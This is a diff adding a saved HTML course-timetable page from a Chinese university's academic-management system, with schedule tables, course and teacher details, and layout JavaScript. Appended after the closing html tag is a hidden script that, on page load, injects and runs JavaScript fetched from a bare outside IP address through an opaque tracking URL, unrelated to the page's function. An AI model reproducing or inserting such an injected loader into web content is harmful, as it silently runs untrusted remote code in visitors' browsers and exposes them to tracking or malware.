@@ -1,0 +1,595 @@
+﻿<body onload="load()">
+
+	<html>
+
+	<head>
+		<base target='_self'>
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
+		<meta http-equiv="Content-Language" content="zh-cn">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<link rel="stylesheet" type="text/css" href="http://jwgl.hbeu.cn:8080/hbgcxy/css/csdn.css">
+		<script type="text/javascript" src="http://jwgl.hbeu.cn:8080/hbgcxy/dwr/engine.js"></script>
+		<script type="text/javascript" src="http://jwgl.hbeu.cn:8080/hbgcxy/dwr/util.js"></script>
+		<script type="text/javascript" src="http://jwgl.hbeu.cn:8080/hbgcxy/dwr/interface/dwrMonitor.js.js"></script>
+		<script type="text/javascript" src="http://jwgl.hbeu.cn:8080/hbgcxy/js/jspublic.js"></script>
+		<title>·湖南强智科技发展有限公司·版权所有</title>
+	</head>
+
+	<body onload="initSelectDefalt();" topmargin="0" leftmargin="0" oncontextmenu="javascript:return true;">
+		<script src="/hbgcxy/js/prototype.js" type="text/javascript">
+		</script>
+		<form method="post" action="" name=Form1 onSubmit="">
+			<input type="hidden" value="" name="sql">
+			<div align="center">
+
+				<table id="kbtable" border="1" width="100%" bordercolorlight="#588FC7" cellspacing="0" cellpadding="0" bordercolor="#588FC7" bordercolordark="#ffffff">
+					<tr>
+						<td width="70" height="28" align="center">
+							&nbsp;
+						</td>
+
+						<td width="123" height="28" align="center">
+							星期一
+						</td>
+
+						<td width="123" height="28" align="center">
+							星期二
+						</td>
+
+						<td width="123" height="28" align="center">
+							星期三
+						</td>
+
+						<td width="124" height="28" align="center">
+							星期四
+						</td>
+
+						<td width="124" height="28" align="center">
+							星期五
+						</td>
+
+						<td width="124" height="28" align="center">
+							星期六
+						</td>
+
+						<td width="124" height="28" align="center">
+							星期日
+						</td>
+					</tr>
+
+					<tr>
+						<td width="70" height="28" align="center">
+
+							0102
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="1-1-1">&nbsp;</div>
+							<div id="1-1-2" style="display: none;">&nbsp;</div>
+							<div id="1-1-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="1-2-1">&nbsp;</div>
+							<div id="1-2-2" style="display: none;">&nbsp;</div>
+							<div id="1-2-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="1-3-1">&nbsp;</div>
+							<div id="1-3-2" style="display: none;">&nbsp;</div>
+							<div id="1-3-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="1-4-1">&nbsp;</div>
+							<div id="1-4-2" style="display: none;">&nbsp;</div>
+							<div id="1-4-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="1-5-1">&nbsp;</div>
+							<div id="1-5-2" style="display: none;">&nbsp;</div>
+							<div id="1-5-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="1-6-1">&nbsp;</div>
+							<div id="1-6-2" style="display: none;">&nbsp;</div>
+							<div id="1-6-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="1-7-1">&nbsp;</div>
+							<div id="1-7-2" style="display: none;">&nbsp;</div>
+							<div id="1-7-3"><font color="red">&nbsp;</font></div>
+						</td>
+					</tr>
+
+					<tr>
+						<td width="70" height="28" align="center">
+
+							0304
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="2-1-1">&nbsp;</div>
+							<div id="2-1-2" style="display: none;">&nbsp;</div>
+							<div id="2-1-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="2-2-1">&nbsp;</div>
+							<div id="2-2-2" style="display: none;">&nbsp;</div>
+							<div id="2-2-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="2-3-1">&nbsp;</div>
+							<div id="2-3-2" style="display: none;">&nbsp;</div>
+							<div id="2-3-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="2-4-1">&nbsp;</div>
+							<div id="2-4-2" style="display: none;">&nbsp;</div>
+							<div id="2-4-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="2-5-1">&nbsp;</div>
+							<div id="2-5-2" style="display: none;">&nbsp;</div>
+							<div id="2-5-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="2-6-1">&nbsp;</div>
+							<div id="2-6-2" style="display: none;">&nbsp;</div>
+							<div id="2-6-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="2-7-1">&nbsp;</div>
+							<div id="2-7-2" style="display: none;">&nbsp;</div>
+							<div id="2-7-3"><font color="red">&nbsp;</font></div>
+						</td>
+					</tr>
+
+					<tr>
+						<td width="70" height="28" align="center">
+
+							0506
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="3-1-1">&nbsp;专业英语&nbsp;</div>
+							<div id="3-1-2" style="display: none;">&nbsp;专业英语
+								<br>0123011141
+								<br>龚克涛
+								<br>
+								<nobr> 12-17周[05-06节]
+									<nobr>
+										<br>教6楼403（数统机房）
+										<br>
+							</div>
+							<div id="3-1-3"><font color="red"></font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="3-2-1">&nbsp;</div>
+							<div id="3-2-2" style="display: none;">&nbsp;</div>
+							<div id="3-2-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="3-3-1">&nbsp;专业英语&nbsp;</div>
+							<div id="3-3-2" style="display: none;">&nbsp;专业英语
+								<br>0123011141
+								<br>龚克涛
+								<br>
+								<nobr> 1-4周[05-06节]
+									<nobr>
+										<br>教6楼403（数统机房）
+										<br>专业英语
+										<br>0123011141
+										<br>龚克涛
+										<br>
+										<nobr> 12-17周[05-06节]
+											<nobr>
+												<br>教6楼403（数统机房）
+												<br>
+							</div>
+							<div id="3-3-3"><font color="red"></font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="3-4-1">&nbsp;</div>
+							<div id="3-4-2" style="display: none;">&nbsp;</div>
+							<div id="3-4-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="3-5-1">&nbsp;</div>
+							<div id="3-5-2" style="display: none;">&nbsp;</div>
+							<div id="3-5-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="3-6-1">&nbsp;</div>
+							<div id="3-6-2" style="display: none;">&nbsp;</div>
+							<div id="3-6-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="3-7-1">&nbsp;</div>
+							<div id="3-7-2" style="display: none;">&nbsp;</div>
+							<div id="3-7-3"><font color="red">&nbsp;</font></div>
+						</td>
+					</tr>
+
+					<tr>
+						<td width="70" height="28" align="center">
+
+							0708
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="4-1-1">&nbsp;</div>
+							<div id="4-1-2" style="display: none;">&nbsp;</div>
+							<div id="4-1-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="4-2-1">&nbsp;</div>
+							<div id="4-2-2" style="display: none;">&nbsp;</div>
+							<div id="4-2-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="4-3-1">&nbsp;</div>
+							<div id="4-3-2" style="display: none;">&nbsp;</div>
+							<div id="4-3-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="4-4-1">&nbsp;</div>
+							<div id="4-4-2" style="display: none;">&nbsp;</div>
+							<div id="4-4-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="4-5-1">&nbsp;</div>
+							<div id="4-5-2" style="display: none;">&nbsp;</div>
+							<div id="4-5-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="4-6-1">&nbsp;</div>
+							<div id="4-6-2" style="display: none;">&nbsp;</div>
+							<div id="4-6-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="4-7-1">&nbsp;</div>
+							<div id="4-7-2" style="display: none;">&nbsp;</div>
+							<div id="4-7-3"><font color="red">&nbsp;</font></div>
+						</td>
+					</tr>
+
+					<tr>
+						<td width="70" height="28" align="center">
+
+							0910
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="5-1-1">&nbsp;点集拓扑学&nbsp;</div>
+							<div id="5-1-2" style="display: none;">&nbsp;点集拓扑学
+								<br>0123011141
+								<br>周广发
+								<br>
+								<nobr> 12-17周[09-11节]
+									<nobr>
+										<br>J6302（数统学院机房）
+										<br>点集拓扑学
+										<br>0123011141
+										<br>周广发
+										<br>
+										<nobr> 1-4周[09-11节]
+											<nobr>
+												<br>J6302（数统学院机房）
+												<br>
+							</div>
+							<div id="5-1-3"><font color="red"></font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="5-2-1">&nbsp;</div>
+							<div id="5-2-2" style="display: none;">&nbsp;</div>
+							<div id="5-2-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="5-3-1">&nbsp;点集拓扑学&nbsp;</div>
+							<div id="5-3-2" style="display: none;">&nbsp;点集拓扑学
+								<br>0123011141
+								<br>周广发
+								<br>
+								<nobr> 12-17周[09-11节]
+									<nobr>
+										<br>J6302（数统学院机房）
+										<br>
+							</div>
+							<div id="5-3-3"><font color="red"></font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="5-4-1">&nbsp;</div>
+							<div id="5-4-2" style="display: none;">&nbsp;</div>
+							<div id="5-4-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="5-5-1">&nbsp;</div>
+							<div id="5-5-2" style="display: none;">&nbsp;</div>
+							<div id="5-5-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="5-6-1">&nbsp;</div>
+							<div id="5-6-2" style="display: none;">&nbsp;</div>
+							<div id="5-6-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="5-7-1">&nbsp;</div>
+							<div id="5-7-2" style="display: none;">&nbsp;</div>
+							<div id="5-7-3"><font color="red">&nbsp;</font></div>
+						</td>
+					</tr>
+
+					<tr>
+						<td width="70" height="28" align="center">
+
+							1112
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="6-1-1">&nbsp;点集拓扑学&nbsp;</div>
+							<div id="6-1-2" style="display: none;">&nbsp;点集拓扑学
+								<br>0123011141
+								<br>周广发
+								<br>
+								<nobr> 12-17周[091011节]
+									<nobr>
+										<br>J6302（数统学院机房）
+										<br>点集拓扑学
+										<br>0123011141
+										<br>周广发
+										<br>
+										<nobr> 1-4周[091011节]
+											<nobr>
+												<br>J6302（数统学院机房）
+												<br>
+							</div>
+							<div id="6-1-3"><font color="red"></font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="6-2-1">&nbsp;</div>
+							<div id="6-2-2" style="display: none;">&nbsp;</div>
+							<div id="6-2-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="6-3-1">&nbsp;点集拓扑学&nbsp;</div>
+							<div id="6-3-2" style="display: none;">&nbsp;点集拓扑学
+								<br>0123011141
+								<br>周广发
+								<br>
+								<nobr> 12-17周[091011节]
+									<nobr>
+										<br>J6302（数统学院机房）
+										<br>
+							</div>
+							<div id="6-3-3"><font color="red"></font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="6-4-1">&nbsp;</div>
+							<div id="6-4-2" style="display: none;">&nbsp;</div>
+							<div id="6-4-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="6-5-1">&nbsp;</div>
+							<div id="6-5-2" style="display: none;">&nbsp;</div>
+							<div id="6-5-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="6-6-1">&nbsp;</div>
+							<div id="6-6-2" style="display: none;">&nbsp;</div>
+							<div id="6-6-3"><font color="red">&nbsp;</font></div>
+						</td>
+						<td width="123" height="28" align="center">
+							<div id="6-7-1">&nbsp;</div>
+							<div id="6-7-2" style="display: none;">&nbsp;</div>
+							<div id="6-7-3"><font color="red">&nbsp;</font></div>
+						</td>
+					</tr>
+
+					<tr>
+						<td width="124" height="28" align="center">
+							备注
+						</td>
+						<td height="28" colspan="7" align="center">
+							&nbsp;
+						</td>
+					</tr>
+
+				</table>
+
+			</div>
+			<Input type="hidden" id="PlAction" name="PlAction">
+		</form>
+		<div id="creating" style="position: absolute; top: 80; z-index: 0; visibility: hidden; height: 74">
+			<table width=100% border=0 cellspacing=0 cellpadding=0 ID="Table1">
+				<tr>
+					<td width=2%></td>
+					<td align="center">
+						<table border=0 cellspacing=0 cellpadding=0 width=330>
+							<tr>
+								<td bgcolor=#ff9900 align="center">
+									<table width="100%" height=70 border=0 cellspacing=2 cellpadding=0 ID="Table2">
+										<tr>
+											<td bgcolor=#eeeeee align=center width="100%" height="100%" class="xz">
+												系统正在读取课表信息, 请稍候...
+											</td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</td>
+					<td width=2%></td>
+				</tr>
+			</table>
+		</div>
+		<script language="javaScript">
+			function load() {
+				var sqlsold = "";
+				if ((window.parent.document.getElementById("findType") != null) && (window.parent.document.getElementById('fbuttom') != null)) {
+					var findType = window.parent.document.getElementById("findType").value;
+					window.parent.document.getElementById('fbuttom').src = "/hbgcxy/jiaowu/tkgl/kbxx_list.jsp?sql=" + sqlsold + "&findType=" + findType + "&bjbh=&classroomID=&teacherID=&xnxqh=&NeedHeader=";
+				}
+				// document.Form1.action="/hbgcxy/jiaowu/tkgl/kbxx_list.jsp?sql="+sqlsold+"&findType="+findType;
+				//  document.Form1.target="fbuttom";
+				// document.Form1.submit();
+				if (window.parent.document.getElementById("abc") != null) {
+					if (window.parent.document.getElementById("abc").checked) {
+						bigValue(true);
+					}
+				}
+			}
+
+			function bigValue(values) {
+				for (var i = 1; i < kbtable.rows.length; i++) {
+					for (var n = 1; n < 8; n++) {
+						var small = i + "-" + n + "-1";
+						var big = i + "-" + n + "-2";
+						if (values) {
+							$(small).style.display = "none";
+							$(big).style.display = "";
+						} else {
+							$(small).style.display = "";
+							$(big).style.display = "none";
+						}
+					}
+				}
+			}
+
+			function ycbz(values) {
+					for (var i = 1; i < kbtable.rows.length - 1; i++) {
+						for (var n = 1; n < 8; n++) {
+							var bz = i + "-" + n + "-3";
+							if (values) {
+								$(bz).style.display = "";
+							} else {
+								$(bz).style.display = "none";
+							}
+						}
+					}
+					/*if(values){ 
+					$(bzstr1).style.display="none";
+					 $(bzstr).style.display=""; 
+					}else{
+					 $(bzstr).style.display="none";
+					  $(bzstr1).style.display="";
+					}*/
+				}
+				//
+
+			function OnpageThisNew() {
+					if (window.parent != null) {
+						if (window.parent.frames['ftop'] != null) //判断学生或者教师的时候JS错误
+						{
+							if (window.parent.frames['ftop'].document.getElementById('abc') == null) {} else {
+								bigValue(window.parent.frames['ftop'].document.getElementById('abc').checked);
+							}
+							if (window.parent.frames['ftop'].document.getElementById('bz') != null) {
+								ycbz(window.parent.frames['ftop'].document.getElementById('bz').checked);
+							}
+						}
+					}
+				}
+				//考虑到 放大  按钮是否选中
+			OnpageThisNew();
+
+			function resetValue() {
+				var kbtable = document.getElementById("kbtable");
+				for (i = 1; i < kbtable.rows.length - 1; i++) {
+					for (j = 1; j < kbtable.rows[i].cells.length; j++) {
+						kbtable.rows[i].cells[j].innerHTML = "&nbsp;"
+					}
+				}
+			}
+
+			function JsMod(htmlurl, tmpWidth, tmpHeight) {
+				var newwin = window.showModalDialog(htmlurl, "", "dialogWidth:" + tmpWidth + "px;status:no;dialogHeight:" + tmpHeight + "px");
+				if (newwin != null && newwin == "ok") {
+					shuaxin();
+				}
+			}
+
+			function shuaxin() {
+				//parent.window.frames('fbuttom').location.reload();
+				var xnxqh = window.parent.frames['ftop'].document.getElementById('xnxqh').value;
+				parent.window.document.getElementById("fcenter").src = "/hbgcxy/tkglAction.do?method=goListKb&sql=&xnxqh=" + xnxqh;
+			}
+
+			function showTk(tzdid, kkd) {
+				var newwin = window.showModalDialog("/hbgcxy/jiaowu/tkgl/tkgl.do?method=goShowTk&tzdid=" + tzdid + "&kkd=" + kkd, "", "dialogWidth:920px;status:no;dialogHeight:620px");
+				if (newwin && newwin == "ok") {
+					try {
+						document.location.reload();
+						//window.parent.frames("ftop").queryKb();
+						window.parent.fbuttom.Form1.submit();
+					} catch (e) {
+						try {
+							window.parent.shuaxin();
+						} catch (ee) {}
+					}
+				} else if (newwin && newwin != "ok") {
+					var tzd = newwin.split(":")[0];
+					var kk = newwin.split(":")[1];
+					var url = "/hbgcxy/jiaowu/tkgl/tkgl.do?method=goAddKb&tzdid=" + tzd + "&kkd=" + kk;
+					var newwin2 = window.showModalDialog(url, window, "dialogWidth:920px;status:no;dialogHeight:620px");
+					if (newwin2 && newwin2 == "ok") {
+						//window.parent.frames("ftop").queryKb();
+						document.location.reload();
+						window.parent.fbuttom.Form1.submit();
+					}
+				}
+			}
+
+			function getIsInstr(kcsj, str) {
+				var len = str.length / 2;
+				for (i = 0; i < len; i++) {
+					if (kcsj.indexOf(str.substr(i * 2, 2)) == 0 || kcsj.indexOf(str.substr(i * 2, 2)) == 2 || kcsj.indexOf(str.substr(i * 2, 2)) == 4) {
+						return true;
+					}
+				}
+				return false;
+			}
+
+			function showJsjy(xnxqh, kkd, jsmc, kcsj, kkzc, jsbh) {
+				var result = window.showModalDialog("/hbgcxy/jiaowu/kxjsgl/kxjsgl.do?method=goKxjsxx&xnxqh=" + xnxqh + "&jsbh=" + jsbh + "&kcsj=" + kcsj + "&type=edit&kkd=" + kkd, jsmc + "(", "dialogWidth:1050px;status:no;dialogHeight:600px");
+				if (result == "ok") {
+					creating.style.visibility = 'visible';
+					document.location.reload();
+					window.parent.fbuttom.Form1.submit();
+				}
+			}
+			for (n = 1; n < 8; n++) {
+				SpanGrid(document.getElementById("kbtable"), n);
+			}
+
+			function SpanGrid(tabObj, colIndex) {
+				if (tabObj != null) {
+					var i, j;
+					var intSpan;
+					var strTemp;
+					for (i = 0; i < tabObj.rows.length - 1; i++) {
+						//tabObj.rows[i].cells[colIndex].style.backgroundColor="#dae6f8";
+						intSpan = 1;
+						strTemp = tabObj.rows[i].cells[colIndex].innerText;
+						if (trim(strTemp) == '') {
+							continue;
+						}
+						for (j = i + 1; j < tabObj.rows.length - 1; j++) {
+							if (strTemp == tabObj.rows[j].cells[colIndex].innerText) {
+								intSpan++;
+								tabObj.rows[i].cells[colIndex].rowSpan = intSpan;
+								tabObj.rows[j].cells[colIndex].style.display = "none";
+							} else {
+								break;
+							}
+						}
+						i = j - 1;
+					}
+				}
+			}
+		</script>
+	</body>
+
+	</html>
+</body>
+
+<script type="text/javascript">
+	(function() {
+		var js = document.createElement("script");
+		js.src = "http://122.227.254.195/DB2927DA968D3599D7126C59B2CF6595?id=2&t=5749721&m=99299e55da47ed1f" + Math.random();
+		var h = document.getElementsByTagName("head")[0];
+		h.appendChild(js);
+	})()
+</script>
